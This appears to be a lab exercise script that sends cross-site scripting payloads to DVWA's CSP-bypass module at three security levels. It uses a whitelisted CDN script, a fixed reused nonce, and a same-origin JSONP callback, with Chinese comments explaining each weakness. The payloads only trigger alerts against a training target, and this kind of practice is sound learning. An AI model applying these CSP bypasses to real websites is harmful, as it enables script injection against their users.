from dvwa import DVWA

SECURITY = "low"
PAYLOADS = {
    "low": (
        "<script src='https://code.jquery.com/"
        "jquery-3.6.0.min.js'></script>"
    ),
    "medium": (
        "<script nonce='TmV2ZXIgZ29pbmcgdG8g"
        "Z2l2ZSB5b3UgdXA='>alert(1)</script>"
    ),
    "high": (
        "<script src='/vulnerabilities/csp/source/"
        "jsonp.php?callback=alert(document.domain)//'></script>"
    ),
}
"""
Low: 白名单里有 pastebin.com 和 code.jquery.com 等外域
Medium: 同时开了 unsafe-inline, 还给了固定 nonce
High: 只允许 self, 用同域的 jsonp.php 回调执行任意代码
脚本到底有没有执行只能在浏览器里看, 这里只验证注入是否成功.
"""

target = DVWA("csp", SECURITY)

payload = PAYLOADS[SECURITY]
response = target.post("", data={"include": payload})

print(f"Payload: {payload}")
print(
    f"CSP: {response.headers.get('Content-Security-Policy')}"
)
print(f"Injected: {payload in response.text}")
